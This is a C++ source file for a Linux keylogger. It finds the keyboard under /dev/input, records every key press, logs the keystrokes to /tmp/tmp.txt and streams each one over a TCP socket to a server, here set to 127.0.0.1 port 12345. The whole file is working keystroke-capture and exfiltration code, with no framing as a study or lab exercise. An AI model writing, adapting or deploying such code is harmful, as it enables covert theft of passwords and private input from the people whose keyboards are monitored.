#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <linux/input.h>
#include <iostream>
#include "keycode_to_ascii.h"
#include <fstream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <cstring>
#include <arpa/inet.h>
#include <linux/uinput.h>



int main() {
    const char* inputDir = "/dev/input/";
    const char* deviceNameContains = "Keyboard";

    DIR* dir = opendir(inputDir);
    if (dir == NULL) {
        perror("Failed to open input directory");
        return 1;
    }

    struct dirent* entry;
    char deviceFile[256] = "";

    while ((entry = readdir(dir)) != NULL) {
        if (strncmp(entry->d_name, "event", 5) == 0) {
            char devicePath[256];
            snprintf(devicePath, sizeof(devicePath), "%s%s", inputDir, entry->d_name);


            int fd = open(devicePath, O_RDONLY);
            if (fd != -1) {
                char name[256];
                if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) >= 0) {
                    if (strstr(name, deviceNameContains) != NULL) {
                        strcpy(deviceFile, devicePath);
                        break;
                    }
                    else if(strstr(name, "keyboard") != NULL){
                        strcpy(deviceFile, devicePath);
                        break;
                    }
                }
                close(fd);
            }
            if (fd == -1) {
                std::cerr << "Error opening file: " << strerror(errno) << std::endl;
                return 1;
            }
        }
    }

    closedir(dir);

    if (deviceFile[0] == '\0') {
        printf("Keyboard device not found.\n");
        return 1;
    }

    printf("Keyboard device found: %s\n", deviceFile);

    std::ofstream outputFile("/tmp/tmp.txt"); // Open the file in /tmp/tmp.txt for writing

    if (!outputFile) {
        std::cerr << "Error opening file." << std::endl;
        return 1;
    }

    // Open the device file
    int fd = open(deviceFile, O_RDONLY);
    if (fd == -1) {
        perror("Failed to open the keyboard device file");
        return 1;
    }

    struct input_event ev;

        




    // Create the client socket
    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        perror("Failed to create socket");
        return 1;
    }

    // Set up the server address
    struct sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(12345); // Specify the target server port
    if (inet_pton(AF_INET, "127.0.0.1", &(serverAddress.sin_addr)) <= 0) {
        perror("Invalid server address");
        close(clientSocket);
        return 1;
    }

    // Connect to the server
    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == -1) {
        perror("Failed to connect to server");
        close(clientSocket);
        //return 1;
    }






    while (1) {
        if (read(fd, &ev, sizeof(struct input_event)) == -1) {
            perror("Failed to read input event");
            close(fd);
            return 1;
        }

        if (ev.type == EV_KEY && ev.value == 1) {
            std::string ascii = getKeycodeToAscii(ev.code);
            std::cout << "Key event detected. Keycode:  " <<  ev.code << "  ascii:" << ascii << std::endl;
            
            std::cout << "the ascii char is:" << &ascii << std::endl;
            //ssize_t bytesSent = send(clientSocket, &ascii, sizeof(ascii), 0);
            ssize_t bytesSent = send(clientSocket, ascii.c_str(), ascii.size(), 0);

            if (bytesSent == -1) {
                perror("Failed to send data to server");
                close(clientSocket);
                //return 1;
            }


            if(ascii == "Q"){
                std::cerr << "Exit." << std::endl;
                break;
            }
            outputFile << ascii;
            
        }
    }
    // Close the client socket
    close(clientSocket);
    outputFile.close(); // Close the /tmp/tmp.txt file
    close(fd);
    

    return 0;
}
